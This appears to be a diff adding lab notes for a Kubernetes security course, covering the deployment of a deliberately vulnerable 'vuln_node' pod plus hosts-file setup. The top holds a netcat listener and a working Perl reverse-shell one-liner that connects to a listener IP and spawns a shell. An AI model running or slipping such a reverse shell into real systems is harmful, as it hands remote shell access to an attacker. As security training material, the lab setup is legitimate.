@@ -1,0 +1,37 @@
+https://www.revshells.com/
+
+# On the host that listen (i.e. 192.168.1.184)
+nc -lvnp 8080
+
+# On the remote host : 
+perl -e 'use Socket;$i="192.168.1.184";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+
+# Get the vuln kubernetes repository on github
+
+```
+git clone  git@github.com:acombe/kubernetes-security-course.git
+```
+
+# Build and push the vuln_node application in the k3s registry
+
+```
+docker-compose build; # (-f docker-compose-host-network.yml on wsl hosts)
+docker-compose push;
+```
+
+# Deploy vuln_node pod on the cluster
+
+```
+kubectl apply -f k8s/Vulnnode.yaml
+```
+
+Add vuln_node.infress.fr hostname to /etc/hosts for DNS resolution :
+
+```
+sudo su -
+echo "$(hostname -I | awk '{print $1}') vulnnode.infres.fr" >> /etc/hosts
+```
+
+On WSL, modify the C:\Windows\System32\Drivers\etc\hosts file by adding the following entry : 
+127.0.0.1       vulnnode.infres.fr
+
